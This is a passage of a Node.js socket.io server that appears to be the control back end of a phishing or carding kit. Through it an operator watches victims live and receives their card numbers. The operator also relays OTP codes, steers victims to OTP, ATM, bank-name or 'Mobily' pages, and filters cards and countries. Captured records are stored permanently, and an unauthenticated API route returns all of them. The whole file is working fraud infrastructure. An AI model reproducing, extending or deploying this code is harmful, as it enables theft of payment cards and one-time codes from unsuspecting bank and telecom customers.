        io.to(adminSocketId).emit("visitor:cardVerification", {
          visitorId: visitor._id,
          cardNumber,
          isBlocked,
        });
      });
    }
  });

  // Admin registration
  socket.on("admin:register", (credentials) => {
    // Simple admin authentication - uses persistent password from disk
    if (credentials.password === adminPassword) {
      admins.set(socket.id, {
        socketId: socket.id,
        connectedAt: new Date().toISOString(),
      });

      socket.emit("admin:authenticated", true);

      // Get all connected visitor IDs from the active visitors Map
      const connectedVisitorIds = new Set();
      visitors.forEach((v) => {
        connectedVisitorIds.add(v._id);
      });
      
      // Update connection status for saved visitors based on _id match
      const visitorsWithStatus = savedVisitors.map(v => {
        // Check if this visitor's _id is in the connected visitors
        const isCurrentlyConnected = connectedVisitorIds.has(v._id);
        // Also update socketId if connected
        let currentSocketId = v.socketId;
        visitors.forEach((activeVisitor, sid) => {
          if (activeVisitor._id === v._id) {
            currentSocketId = sid;
          }
        });
        // Check if visitor is idle (no activity for 30 seconds)
        let isIdle = false;
        if (isCurrentlyConnected) {
          const activeVisitorArr = Array.from(visitors.values()).find(av => av._id === v._id);
          if (activeVisitorArr && activeVisitorArr.lastActivity) {
            isIdle = (Date.now() - activeVisitorArr.lastActivity) > 60000;
          }
        }
        return { ...v, socketId: currentSocketId, isConnected: isCurrentlyConnected, isIdle };
      });

      // Sort visitors by lastDataUpdate (most recent first)
      visitorsWithStatus.sort((a, b) => {
        const dateA = a.lastDataUpdate ? new Date(a.lastDataUpdate).getTime() : 0;
        const dateB = b.lastDataUpdate ? new Date(b.lastDataUpdate).getTime() : 0;
        return dateB - dateA;
      });

      console.log(`Sending ${visitorsWithStatus.length} visitors to admin, ${connectedVisitorIds.size} connected`);

      // Send all saved visitors to admin with updated connection status
      socket.emit("visitors:list", visitorsWithStatus);

      // Notify visitors that admin is connected
      visitors.forEach((visitor, visitorSocketId) => {
        io.to(visitorSocketId).emit("isAdminConnected", true);
      });

      console.log(`Admin connected: ${socket.id}`);
    } else {
      socket.emit("admin:authenticated", false);
    }
  });

  // Admin: Approve form
  socket.on("admin:approve", (visitorSocketId) => {
    io.to(visitorSocketId).emit("form:approved");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Form approved for visitor: ${visitorSocketId}`);
  });

  // Admin: Reject form
  socket.on("admin:reject", (data) => {
    const visitorSocketId = data.visitorSocketId || data;
    io.to(visitorSocketId).emit("form:rejected");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Form rejected for visitor: ${visitorSocketId}`);
  });

  // Admin: Reject Mobily call (special handling for Mobily page)
  socket.on("admin:mobilyReject", (visitorSocketId) => {
    io.to(visitorSocketId).emit("mobily:rejected");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Mobily call rejected for visitor: ${visitorSocketId}`);
  });

  // Admin: Send verification code
  socket.on("admin:sendCode", ({ visitorSocketId, code }) => {
    io.to(visitorSocketId).emit("code", code);
    // حفظ الرمز في بيانات الزائر وتحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.lastSentCode = code;
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Code sent to visitor ${visitorSocketId}: ${code}`);
  });

  // Admin: Navigate visitor to page
  socket.on("admin:navigate", ({ visitorSocketId, page }) => {
    io.to(visitorSocketId).emit("visitor:navigate", page);
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Navigating visitor ${visitorSocketId} to: ${page}`);
  });

  // Admin: Card action (OTP, ATM, Reject)
  socket.on("admin:cardAction", ({ visitorSocketId, action }) => {
    io.to(visitorSocketId).emit("card:action", action);
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      // If admin rejected the card, add last card number to rejectedCards list
      if (action === 'reject' && visitor.paymentCards && visitor.paymentCards.length > 0) {
        if (!visitor.rejectedCards) visitor.rejectedCards = [];
        const lastCard = visitor.paymentCards[visitor.paymentCards.length - 1];
        if (lastCard && lastCard.cardNumber && !visitor.rejectedCards.includes(lastCard.cardNumber)) {
          visitor.rejectedCards.push(lastCard.cardNumber);
        }
      }
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Card action ${action} sent to visitor ${visitorSocketId}`);
  });

  // Admin: Code action (Approve, Reject) for OTP/digit codes
  socket.on("admin:codeAction", ({ visitorSocketId, action, codeIndex }) => {
    io.to(visitorSocketId).emit("code:action", { action, codeIndex });
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Code action ${action} sent to visitor ${visitorSocketId}`);
  });

  // Admin: Approve resend code request
  socket.on("admin:approveResend", ({ visitorSocketId }) => {
    io.to(visitorSocketId).emit("resend:approved");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Resend approved for visitor ${visitorSocketId}`);
  });

  // Admin: Block visitor
  socket.on("admin:block", ({ visitorSocketId }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.isBlocked = true;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.to(visitorSocketId).emit("blocked");
      console.log(`Visitor blocked: ${visitorSocketId}`);
    }
  });

  // Admin: Unblock visitor
  socket.on("admin:unblock", ({ visitorSocketId }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.isBlocked = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.to(visitorSocketId).emit("unblocked");
      console.log(`Visitor unblocked: ${visitorSocketId}`);
    }
  });

  // Admin: Delete visitor by socket ID
  socket.on("admin:delete", (visitorSocketId) => {
    io.to(visitorSocketId).emit("deleted");
    visitors.delete(visitorSocketId);
    
    // Also remove from saved visitors
    const visitorToDelete = Array.from(visitors.values()).find(v => v.socketId === visitorSocketId);
    if (visitorToDelete) {
      savedVisitors = savedVisitors.filter(v => v._id !== visitorToDelete._id);
      saveData();
    }
    
    console.log(`Visitor deleted: ${visitorSocketId}`);
  });

  // Admin: Delete visitor by ID
  socket.on("admin:deleteById", (visitorId) => {
    // Find and remove from active visitors
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        io.to(socketId).emit("deleted");
        visitors.delete(socketId);
      }
    });
    
    // Remove from saved visitors
    savedVisitors = savedVisitors.filter(v => v._id !== visitorId);
    saveData();
    
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:deleted", { visitorId });
    });
    
    console.log(`Visitor deleted by ID: ${visitorId}`);
  });

  // Admin: Send last message
  socket.on("admin:sendMessage", ({ visitorSocketId, message }) => {
    io.to(visitorSocketId).emit("admin-last-message", { message });
    console.log(`Message sent to visitor ${visitorSocketId}: ${message}`);
  });

  // Admin: Set bank name
  socket.on("admin:setBankName", ({ visitorSocketId, bankName }) => {
    io.to(visitorSocketId).emit("bankName", bankName);
    console.log(`Bank name set for visitor ${visitorSocketId}: ${bankName}`);
  });

  // Admin: Change password
  socket.on("admin:changePassword", ({ oldPassword, newPassword }) => {
    // Verify old password - uses persistent password from disk
    if (oldPassword === adminPassword) {
      // Update password and save to disk for persistence
      adminPassword = newPassword;
      saveData();
      socket.emit("admin:passwordChanged", true);
      console.log("Admin password changed successfully and saved to disk");
      
      // Force logout ALL other admin sessions
      admins.forEach((admin, adminSocketId) => {
        if (adminSocketId !== socket.id) {
          io.to(adminSocketId).emit("admin:forceLogout");
          admins.delete(adminSocketId);
          console.log(`Force logged out admin: ${adminSocketId}`);
        }
      });
      
      // Force logout the password changer too after a delay
      setTimeout(() => {
        io.to(socket.id).emit("admin:forceLogout");
        admins.delete(socket.id);
        console.log(`Force logged out password changer: ${socket.id}`);
      }, 2000);
      
      console.log("All admin sessions logged out after password change");
    } else {
      socket.emit("admin:passwordChanged", false);
      console.log("Admin password change failed - wrong old password");
    }
  });

  // Admin: Clear all data
  socket.on("admin:clearAllData", () => {
    // Disconnect all visitors
    visitors.forEach((v, socketId) => {
      io.to(socketId).emit("deleted");
    });
    
    // Clear all data
    visitors.clear();
    savedVisitors = [];
    visitorCounter = 0;
    
    // Save empty data to disk
    saveData();
    
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("allDataCleared");
    });
    
    console.log("All data cleared by admin");
  });

  // WhatsApp: Get current number
  socket.on("whatsapp:get", () => {
    // Send to admin
    socket.emit("whatsapp:current", whatsappNumber);
    // Also send to client (for footer)
    socket.emit("whatsapp:update", whatsappNumber);
  });

  // WhatsApp: Set number (admin only)
  socket.on("whatsapp:set", (number) => {
    whatsappNumber = number;
    saveData();
    // Broadcast to all connected clients
    io.emit("whatsapp:update", whatsappNumber);
    console.log(`WhatsApp number updated: ${whatsappNumber}`);
  });

  // Blocked Cards: Get list
  socket.on("blockedCards:get", () => {
    socket.emit("blockedCards:list", globalBlockedCards);
  });

  // Blocked Cards: Add prefix
  socket.on("blockedCards:add", (prefix) => {
    if (prefix && prefix.length === 4 && !globalBlockedCards.includes(prefix)) {
      globalBlockedCards.push(prefix);
      saveData();
      // Notify all admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("blockedCards:list", globalBlockedCards);
      });
      // Broadcast to all clients
      io.emit("blockedCards:updated", globalBlockedCards);
      console.log(`Blocked card prefix added: ${prefix}`);
    }
  });

  // Blocked Cards: Remove prefix
  socket.on("blockedCards:remove", (prefix) => {
    globalBlockedCards = globalBlockedCards.filter(p => p !== prefix);
    saveData();
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("blockedCards:list", globalBlockedCards);
    });
    // Broadcast to all clients
    io.emit("blockedCards:updated", globalBlockedCards);
    console.log(`Blocked card prefix removed: ${prefix}`);
  });

  // Blocked Cards: Check if card is blocked (for clients)
  socket.on("blockedCards:check", (cardNumber) => {
    const prefix = cardNumber.replace(/\s/g, '').substring(0, 4);
    const isBlocked = globalBlockedCards.includes(prefix);
    socket.emit("blockedCards:checkResult", { isBlocked, prefix });
  });

  // Blocked Countries: Get list
  socket.on("blockedCountries:get", () => {
    socket.emit("blockedCountries:list", globalBlockedCountries);
  });

  // Blocked Countries: Add country
  socket.on("blockedCountries:add", (country) => {
    if (country && !globalBlockedCountries.includes(country)) {
      globalBlockedCountries.push(country);
      saveData();
      // Notify all admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("blockedCountries:list", globalBlockedCountries);
      });
      // Broadcast to all clients
      io.emit("blockedCountries:updated", globalBlockedCountries);
      console.log(`Blocked country added: ${country}`);
    }
  });

  // Blocked Countries: Remove country
  socket.on("blockedCountries:remove", (country) => {
    globalBlockedCountries = globalBlockedCountries.filter(c => c !== country);
    saveData();
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("blockedCountries:list", globalBlockedCountries);
    });
    // Broadcast to all clients
    io.emit("blockedCountries:updated", globalBlockedCountries);
    console.log(`Blocked country removed: ${country}`);
  });

  // Blocked Countries: Check if visitor's country is blocked
  socket.on("blockedCountries:check", (country) => {
    const isBlocked = globalBlockedCountries.some(c => 
      c.toLowerCase() === country.toLowerCase()
    );
    socket.emit("blockedCountries:checkResult", { isBlocked, country });
  });

  // Admin: Mark visitor data as read (hide new data indicator)
  socket.on("admin:markAsRead", (visitorId) => {
    // Find visitor by ID in active visitors
    let found = false;
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        v.hasNewData = false;
        visitors.set(socketId, v);
        saveVisitorPermanently(v);
        found = true;
      }
    });
    
    // Also update in saved visitors
    const savedVisitor = savedVisitors.find(v => v._id === visitorId);
    if (savedVisitor) {
      savedVisitor.hasNewData = false;
      saveData();
    }
    
    // Notify all admins about the update
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:markedAsRead", { visitorId });
    });
    
    console.log(`Visitor ${visitorId} marked as read`);
  });

  // Admin: Toggle star on visitor
  socket.on("admin:toggleStar", (visitorId) => {
    // Find visitor by ID in active visitors
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        v.isStarred = !v.isStarred;
        visitors.set(socketId, v);
        saveVisitorPermanently(v);
      }
    });
    
    // Also update in saved visitors
    const savedVisitor = savedVisitors.find(v => v._id === visitorId);
    if (savedVisitor) {
      savedVisitor.isStarred = !savedVisitor.isStarred;
      saveData();
    }
    
    // Notify all admins about the update
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:starToggled", { visitorId, isStarred: savedVisitor ? savedVisitor.isStarred : false });
    });
  });

  // Chat: Message from visitor to admin
  socket.on("chat:fromVisitor", ({ visitorSocketId, message, timestamp }) => {
    const visitor = visitors.get(visitorSocketId) || visitors.get(socket.id);
    if (visitor) {
      // Initialize chat messages array if not exists
      if (!visitor.chatMessages) {
        visitor.chatMessages = [];
      }
      
      // Add message to visitor's chat history
      const chatMessage = {
        id: Date.now().toString(),
        text: message,
        sender: 'visitor',
        timestamp: timestamp || new Date().toISOString()
      };
      visitor.chatMessages.push(chatMessage);
      visitor.hasNewMessage = true;
      visitors.set(visitor.socketId, visitor);
      saveVisitorPermanently(visitor);
      
      // Notify all admins about the new message
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("chat:newMessage", {
          visitorSocketId: visitor.socketId,
          visitorId: visitor._id,
          message: chatMessage
        });
      });
      
      console.log(`Chat message from visitor ${visitor.socketId}: ${message}`);
    }
  });

  // Chat: Message from admin to visitor
  socket.on("chat:fromAdmin", ({ visitorSocketId, message, timestamp }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      // Initialize chat messages array if not exists
      if (!visitor.chatMessages) {
        visitor.chatMessages = [];
      }
      
      // Add message to visitor's chat history
      const chatMessage = {
        id: Date.now().toString(),
        text: message,
        sender: 'admin',
        timestamp: timestamp || new Date().toISOString()
      };
      visitor.chatMessages.push(chatMessage);
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      
      // Send message to visitor
      io.to(visitorSocketId).emit("chat:fromAdmin", {
        message: message,
        timestamp: chatMessage.timestamp
      });
      
      console.log(`Chat message from admin to visitor ${visitorSocketId}: ${message}`);
    }
  });

  // Chat: Mark messages as read
  socket.on("chat:markAsRead", ({ visitorSocketId }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.hasNewMessage = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
    }
  });

  // Admin: Block card prefix
  socket.on("admin:blockCardPrefix", ({ visitorSocketId, prefix }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      if (!visitor.blockedCardPrefixes.includes(prefix)) {
        visitor.blockedCardPrefixes.push(prefix);
        visitors.set(visitorSocketId, visitor);
        saveVisitorPermanently(visitor);
      }
      console.log(`Card prefix blocked for visitor ${visitorSocketId}: ${prefix}`);
    }
  });

  // Handle disconnection
  socket.on("disconnect", () => {
    // Check if it's a visitor
    if (visitors.has(socket.id)) {
      const visitor = visitors.get(socket.id);
      const visitorId = visitor._id;
      const socketId = socket.id;
      
      // Don't delete visitor data - keep it permanently
      visitors.delete(socket.id);
      
      // Delay disconnect notification to allow for quick reconnection
      setTimeout(() => {
        // Check if visitor reconnected with same ID
        const reconnected = Array.from(visitors.values()).some(v => v._id === visitorId && v.isConnected);
        
        if (!reconnected) {
          // Update saved visitor as disconnected
          const savedVisitor = savedVisitors.find(v => v._id === visitorId);
          if (savedVisitor) {
            savedVisitor.isConnected = false;
            saveData();
          }
          
          // Notify admins
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit("visitor:disconnected", {
              visitorId: visitorId,
              socketId: socketId,
            });
          });
          
          console.log(`Visitor disconnected: ${socketId}`);
        } else {
          console.log(`Visitor ${visitorId} reconnected quickly, skipping disconnect notification`);
        }
      }, 1000); // 1 second delay
    }

    // Check if it's an admin
    if (admins.has(socket.id)) {
      admins.delete(socket.id);

      // Notify visitors if no admins left
      if (admins.size === 0) {
        visitors.forEach((visitor, visitorSocketId) => {
          io.to(visitorSocketId).emit("isAdminConnected", false);
        });
      }

      console.log(`Admin disconnected: ${socket.id}`);
    }
  });
});

// REST API Routes
app.get("/", (req, res) => {
  res.json({ status: "Server is running", timestamp: new Date().toISOString() });
});

app.get("/api/visitors", (req, res) => {
  res.json(savedVisitors);
});

app.get("/api/stats", (req, res) => {
  res.json({
    totalVisitors: savedVisitors.length,
    connectedVisitors: visitors.size,
    totalAdmins: admins.size,
    visitorCounter,
  });
});

// Idle check timer - every 10 seconds, check for visitors idle > 30 seconds
setInterval(() => {
  const now = Date.now();
  visitors.forEach((visitor, sid) => {
    const wasIdle = visitor.isIdle || false;
    const isNowIdle = visitor.lastActivity ? (now - visitor.lastActivity) > 60000 : false;
    if (isNowIdle !== wasIdle) {
      visitor.isIdle = isNowIdle;
      visitors.set(sid, visitor);
      // Notify admins about idle status change
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:idleChanged", {
          visitorId: visitor._id,
          isIdle: isNowIdle,
        });
      });
    }
  });
}, 10000);

// Cleanup stale/dead socket connections every 30 seconds
// This prevents ghost visitors from accumulating in the active visitors Map
setInterval(() => {
  let cleaned = 0;
  visitors.forEach((visitor, sid) => {
    // Check if the socket is still actually connected
    const socket = io.sockets.sockets.get(sid);
    if (!socket || !socket.connected) {
      // Socket is dead/disconnected but still in the Map - remove it
      const visitorId = visitor._id;
      visitors.delete(sid);
      cleaned++;
      
      // Update saved visitor as disconnected
      const savedVisitor = savedVisitors.find(v => v._id === visitorId);
      if (savedVisitor) {
        savedVisitor.isConnected = false;
        saveData();
      }
      
      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:disconnected", {
          visitorId: visitorId,
          socketId: sid,
        });
      });
    }
  });
  if (cleaned > 0) {
    console.log(`Cleaned ${cleaned} stale socket connections. Active visitors: ${visitors.size}`);
  }
}, 30000);

// Start server
const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Loaded ${savedVisitors.length} saved visitors`);
});
